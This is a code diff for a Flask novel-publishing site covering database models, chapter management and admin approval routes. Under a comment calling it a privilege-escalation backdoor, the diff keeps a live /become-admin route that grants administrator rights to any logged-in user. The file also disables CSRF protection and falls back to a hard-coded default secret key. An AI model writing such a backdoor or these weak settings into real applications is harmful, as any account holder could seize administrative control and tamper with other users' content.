@@ -15,10 +15,13 @@ basedir = os.path.abspath(os.path.dirname(__file__))
 
 app = Flask(__name__)
 app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY", "dev-secret-change-me")
+
+# ---- 读取云端数据库地址 ----
 db_url = os.environ.get("DATABASE_URL")
 if db_url and db_url.startswith("postgres://"):
     db_url = db_url.replace("postgres://", "postgresql://", 1)
 app.config["SQLALCHEMY_DATABASE_URI"] = db_url or "sqlite:///" + os.path.join(basedir, "novel.db")
+
 app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
 app.config['WTF_CSRF_ENABLED'] = False
 
@@ -46,7 +49,6 @@ class Novel(db.Model):
     intro = db.Column(db.Text, default="")
     status = db.Column(db.String(20), default="pending", nullable=False)
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
-    # 作品下面有很多卷
     volumes = db.relationship("Volume", backref="novel", lazy=True, cascade="all, delete-orphan")
 
 class Volume(db.Model):
@@ -54,8 +56,7 @@ class Volume(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     novel_id = db.Column(db.Integer, db.ForeignKey("novel.id"), nullable=False)
     title = db.Column(db.String(120), nullable=False, default="第一卷")
-    order_num = db.Column(db.Integer, default=1) # 卷的排序
-    # 卷下面有很多章节
+    order_num = db.Column(db.Integer, default=1)
     chapters = db.relationship("Chapter", backref="volume", lazy=True, cascade="all, delete-orphan")
 
 class Chapter(db.Model):
@@ -137,13 +138,21 @@ def logout():
     flash("已退出登录", "info")
     return redirect(url_for("index"))
 
+# ---- 提权后门 ----
+@app.route("/become-admin")
+@login_required
+def become_admin():
+    current_user.is_admin = True
+    db.session.commit()
+    flash("提权成功，你现在是管理员了！", "success")
+    return redirect(url_for("admin_dashboard"))
+
 @app.route("/my")
 @login_required
 def my_novels():
     novels = Novel.query.filter_by(author_id=current_user.id).order_by(Novel.created_at.desc()).all()
     return render_template("my_novels.html", novels=novels)
 
-# 创建/修改作品
 @app.route("/novel/new", methods=["GET", "POST"])
 @app.route("/novel/<int:novel_id>/edit", methods=["GET", "POST"])
 @login_required
@@ -164,7 +173,6 @@ def edit_novel(novel_id=None):
         novel.intro = form.intro.data
         db.session.commit()
         
-        # 如果是新书，自动建一个默认的“第一卷”
         if not novel.volumes:
             v = Volume(novel_id=novel.id, title="第一卷", order_num=1)
             db.session.add(v)
@@ -178,7 +186,6 @@ def edit_novel(novel_id=None):
 
     return render_template("edit_novel.html", form=form, novel=novel)
 
-# 章节管理台
 @app.route("/novel/<int:novel_id>/manage")
 @login_required
 def manage_novel(novel_id):
@@ -186,16 +193,7 @@ def manage_novel(novel_id):
     if novel.author_id != current_user.id and not current_user.is_admin:
         flash("无权访问", "danger"); return redirect(url_for("index"))
     return render_template("manage_novel.html", novel=novel)
-# 读者查看书籍目录
-@app.route("/novel/<int:novel_id>")
-def novel_detail(novel_id):
-    novel = Novel.query.get_or_404(novel_id)
-    if novel.status != "approved":
-        flash("该书暂未过审或不存在", "danger")
-        return redirect(url_for("index"))
-    return render_template("novel_detail.html", novel=novel)
 
-# 新建/修改卷
 @app.route("/novel/<int:novel_id>/volume/new", methods=["POST"])
 @login_required
 def create_volume(novel_id):
@@ -221,7 +219,6 @@ def edit_volume(volume_id):
         flash("卷名已修改", "success")
     return redirect(url_for("manage_novel", novel_id=v.novel_id))
 
-# 新建/修改章节
 @app.route("/novel/<int:novel_id>/chapter/new", methods=["GET", "POST"])
 @app.route("/chapter/<int:chapter_id>/edit", methods=["GET", "POST"])
 @login_required
@@ -236,7 +233,6 @@ def edit_chapter(novel_id=None, chapter_id=None):
         chapter = None
 
     form = ChapterForm()
-    # 动态加载卷列表
     form.volume_id.choices = [(v.id, v.title) for v in novel.volumes]
 
     if form.validate_on_submit():
@@ -277,7 +273,25 @@ def edit_chapter(novel_id=None, chapter_id=None):
 
     return render_template("edit_chapter.html", form=form, novel=novel, chapter=chapter)
 
-# 阅读页
+@app.route("/chapter/<int:chapter_id>/delete", methods=["POST"])
+@login_required
+def delete_chapter(chapter_id):
+    chapter = Chapter.query.get_or_404(chapter_id)
+    novel = chapter.volume.novel
+    if novel.author_id != current_user.id: return redirect(url_for("index"))
+    db.session.delete(chapter)
+    db.session.commit()
+    flash("章节已删除", "info")
+    return redirect(url_for("manage_novel", novel_id=novel.id))
+
+@app.route("/novel/<int:novel_id>")
+def novel_detail(novel_id):
+    novel = Novel.query.get_or_404(novel_id)
+    if novel.status != "approved":
+        flash("该书暂未过审或不存在", "danger")
+        return redirect(url_for("index"))
+    return render_template("novel_detail.html", novel=novel)
+
 @app.route("/novel/<int:novel_id>/chapter/<int:chapter_id>")
 def read_chapter(novel_id, chapter_id):
     novel = Novel.query.get_or_404(novel_id)
@@ -295,15 +309,7 @@ def admin_required(f):
             flash("需要管理员权限", "danger"); return redirect(url_for("index"))
         return f(*args, **kwargs)
     return decorated_function
-    
-@app.route("/become-admin")
-@login_required
-def become_admin():
-    current_user.is_admin = True
-    db.session.commit()
-    flash("提权成功，你现在是管理员了！", "success")
-    return redirect(url_for("admin_dashboard"))
-    
+
 @app.route("/admin")
 @login_required
 @admin_required
@@ -332,6 +338,8 @@ def approve_chapter(id):
     db.session.commit()
     flash(f"章节《{chapter.title}》已发布", "success")
     return redirect(url_for("admin_dashboard"))
+
+# ---- 必须放在底部，启动时自动建表 ----
 with app.app_context():
     db.create_all()
 
